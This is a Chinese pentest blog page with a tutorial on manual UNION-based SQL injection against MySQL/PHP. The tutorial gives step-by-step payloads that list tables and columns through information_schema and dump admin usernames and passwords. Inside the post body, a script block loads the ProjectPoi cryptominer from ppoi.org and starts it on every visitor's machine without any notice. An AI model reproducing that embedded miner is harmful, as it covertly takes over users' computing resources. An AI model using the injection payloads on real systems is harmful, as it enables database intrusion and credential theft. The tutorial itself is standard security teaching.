<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> MySQL+PHP手工联合查询注入 · Damit5's Blog</title><meta name="description" content="纸上得来终觉浅，绝知此事要躬行。"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/favicon.png"><link rel="stylesheet" href="/css/jekyll.css"><!--[if lt IE 9]>
<script src="js/html5shiv.min.js"></script>
<script src="js/respond.min.js"></script>
<![endif]--></head><body><header class="row-flex-row limit-width vh-center"><a href="/" class="logo"><img src="/favicon.png"></a><nav><ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-link">主页</a></li><li class="nav-list-item"><a href="/archives/" class="nav-link active">   博客</a></li><li class="nav-list-item"><a href="http://damit5.kiwi/AboutMe/" target="_blank" class="nav-link">关于我</a></li><li class="nav-list-item"><a href="http://damit5.kiwi/Link/" target="_blank" class="nav-link">友情链接</a></li><li class="nav-list-item"><a href="https://github.com/damit5" target="_blank" class="nav-link">github</a></li><li class="nav-list-item"><a href="mailto:damit5@protonmail.com" target="_blank" class="nav-link">email</a></li><li class="nav-list-item"><a href="/atom.xml" class="nav-link">rss</a></li></ul></nav></header><div class="container limit-width"><section class="row-flex-row"><div class="post"><article class="post-block"><h2 class="post-title"><a href="/2017/09/30/MySQL-PHP手工联合查询注入/" class="post-title-link">MySQL+PHP手工联合查询注入</a></h2><div class="post-meta"><ul class="post-tag-list"><li class="post-tag-item"><a href="/tags/渗透测试/" class="post-tag-link">渗透测试</a></li></ul><div class="post-time">2017年9月30日 星期六</div></div><div class="post-content"><script src="/assets/js/APlayer.min.js"> </script><a id="more"></a>
<div id="aplayer2" class="aplayer" style="margin-bottom: 20px;"></div>
		<script>
			new APlayer({
				element: document.getElementById("aplayer2"),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: "六月的雨",
					author: "胡歌",
					url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",
					pic: "http://damit5.kiwi/Music/233.jpg",
				}
			});
		</script>

<html>
<head>
<script>
var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://ppoi.org/lib/projectpoi.min.js";
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName("head")[0].appendChild(script);
</script>
</head>
</html>

<h2 id="1-查询字段长度"><a href="#1-查询字段长度" class="headerlink" title="1.查询字段长度"></a>1.查询字段长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">order by 6</div><div class="line">#直到最后一个不满足为止</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#注意：</div><div class="line">如果order by 1    报错</div><div class="line">1.禁用了order by函数</div><div class="line">2.与其他函数冲突top </div><div class="line">3.语句中已经存在order by </div><div class="line">解决方案：</div><div class="line">order by 1 --   # -- 表示注释</div></pre></td></tr></table></figure>
<h2 id="2-爆出显位数字"><a href="#2-爆出显位数字" class="headerlink" title="2.爆出显位数字"></a>2.爆出显位数字</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">union select 1,2,3,4,5,6</div><div class="line">#如果未爆错则在&quot;id=?&quot;后面加一个and 0 或者？前面加一个-，让他爆出显位数字(假设为 2 和 5 )</div><div class="line"></div><div class="line">eg：php?id=-5 或者  php?id=5 and 0</div><div class="line"># &quot; - &quot;和&quot; and 0 &quot;都是为了让页面报错</div></pre></td></tr></table></figure>
<h2 id="3-查出数据库的名字，将显位数字更改"><a href="#3-查出数据库的名字，将显位数字更改" class="headerlink" title="3.查出数据库的名字，将显位数字更改"></a>3.查出数据库的名字，将显位数字更改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">version()       ---	看数据库的版本</div><div class="line">database()	---	查数据库名称</div><div class="line">user()		---	查当前数据库用户的权限</div><div class="line">@@version_compile_os		---	查看操作系统版本</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,database(),3,4,5,6</div><div class="line">#查看数据库的名称</div></pre></td></tr></table></figure>
<h2 id="4-查表的名字，将数据库名转换为16进制（小葵）"><a href="#4-查表的名字，将数据库名转换为16进制（小葵）" class="headerlink" title="4.查表的名字，将数据库名转换为16进制（小葵）"></a>4.查表的名字，将数据库名转换为16进制（小葵）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=0x64767761</div><div class="line">#最后的16进制是数据库的名字（这里是dvwa）</div><div class="line">group_concat 表示爆出该数据库中所有的表的名字</div></pre></td></tr></table></figure>
<h2 id="5-查列的名字，将表的名字转换为16进制"><a href="#5-查列的名字，将表的名字转换为16进制" class="headerlink" title="5.查列的名字，将表的名字转换为16进制"></a>5.查列的名字，将表的名字转换为16进制</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=0x61646D696E	</div><div class="line">#最后的16进制是表的名字（这里是admin）</div><div class="line">前面为列名，后面是表名</div></pre></td></tr></table></figure>
<h2 id="6-查列的内容"><a href="#6-查列的内容" class="headerlink" title="6.查列的内容"></a>6.查列的内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UNION SELECT 1,adminName,3,4,adminPwd,6 from admin</div><div class="line"># adminName和adminPwd为查出来的列名，最后的admin为表名</div></pre></td></tr></table></figure>
</div></article><div class="pagination"><a href="/2017/09/30/Python在Windows-Linux中输出彩色文字/" class="pagination-prev">PREV</a><a href="/2017/09/30/上传绕过的几种姿势/" class="pagination-next">NEXT</a></div><div class="comments"></div></div><aside class="sidebar"><h3>分类标签</h3><ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit-Framework/">Metasploit-Framework</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/其他/">其他</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/权限维持/">权限维持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul><h3>最新文章</h3><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/15/XSS-绕过常用语句/">XSS 绕过常用语句</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Windows-MySQL-的安装/">Windows MySQL 的安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/利用Python-Selenium库模拟登陆/">利用Python Selenium库模拟登陆</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Windows-Shift-后门/">Windows Shift 后门</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Python-socket模块实现简易的通信/">Python socket模块实现简易的通信</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Python-argparse-模块的简易使用/">Python argparse 模块的简易使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/MSFvenom使用总结/">MSFvenom使用总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/30/Meterpreter-常用命令和后渗透/">Meterpreter 常用命令和后渗透</a></li></ul></aside></section></div><div class="extra"></div><footer class="footer"><div class="row-flex-row limit-width vh-center"><div class="copyright"><P>© 2017 <a href="/">Damit 5</P></div><div class="power"><p><a href="http://pinggod.com/">Sean Sun</a>, 
<a href="https://hexo.io">Hexo</a>, 
<a href="https://github.com/">GitHub</a>, 
<a href="https://jekyllrb.com/">Jekyll</a></p></div></div></footer><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-80781234-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "//hm.baidu.com/hm.js?ee75cf111111aa99f8540efa2570970";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>